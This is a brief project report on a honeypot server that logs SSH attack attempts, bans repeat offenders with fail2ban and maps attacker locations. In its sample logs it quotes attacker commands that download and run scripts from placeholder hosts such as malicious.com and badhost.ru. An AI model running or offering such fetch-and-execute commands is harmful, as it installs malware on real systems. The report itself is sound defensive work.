Honeypot Server to Detect Attack Patterns - Project Report

Project Title:
Honeypot Server to Detect Attack Patterns

Objective:
Deploy a honeypot server to simulate vulnerable services (SSH/FTP), attract real-world attackers, log their activity, identify attack patterns, block malicious actors, and visualize global attacker behavior.

Tools & Technologies:
Tool           | Purpose
-------------- | ------------------------------------------
Cowrie         | SSH/Telnet honeypot to emulate shell
Python         | Custom honeypot + log parsing & analysis
fail2ban       | Automatic IP banning for repeated attacks
GeoIP API      | IP geolocation
Matplotlib/Folium | Visualization

Architecture Overview:
Attacker <--> Honeypot VM <--> Logging System --> Log Analyzer --> GeoIP + Visualization

Setup Guide
1. Install Dependencies: bash setup.sh
2. Run Honeypot: python3 honeypot/custom_honeypot.py
3. Logs stored in logs/cowrie.log

Sample Logs:
[2025-06-10 10:44:12] IP: 45.67.89.101 CMD: SSH-2.0-OpenSSH_8.0
[2025-06-10 10:44:13] IP: 45.67.89.101 CMD: wget http://malicious.com/virus.sh

Sample Attack Commands:
wget http://malicious.com/script.sh
curl http://badhost.ru/backdoor.sh
/bin/sh install.sh

Log Analysis:
- 87 unique IPs detected in 3 days.
- 3 IPs responsible for ~65% of attempts.
- Most common method: wget or curl to fetch malware.

Top IPs:
192.168.1.23    - 23 attempts
154.34.12.9     - 18 attempts
200.45.67.1     - 12 attempts

Fail2Ban Integration:
Blocks repeated attackers after 3 failed attempts.
- Jail: honeypot, Port: 2222, Max Retry: 3, Ban Time: 3600s
- Regex: \[.*\] IP: <HOST> CMD:.*

IP Geolocation & Visualization:
- geoip_lookup.py used to map IPs
- world_map.html: Interactive map
- top_attackers_bar_chart.png: Bar chart

Security Outcomes:
Metric                 | Value
---------------------- | ------
Unique IPs logged      | 87
Attacks blocked        | 15 (via fail2ban)
Avg. attempts/IP       | 6.2
Attack commands logged | 241

Conclusion:
Successfully simulated and detected attacker behaviors.
Visualized geographic patterns.
Integrated fail2ban to auto-block threats.
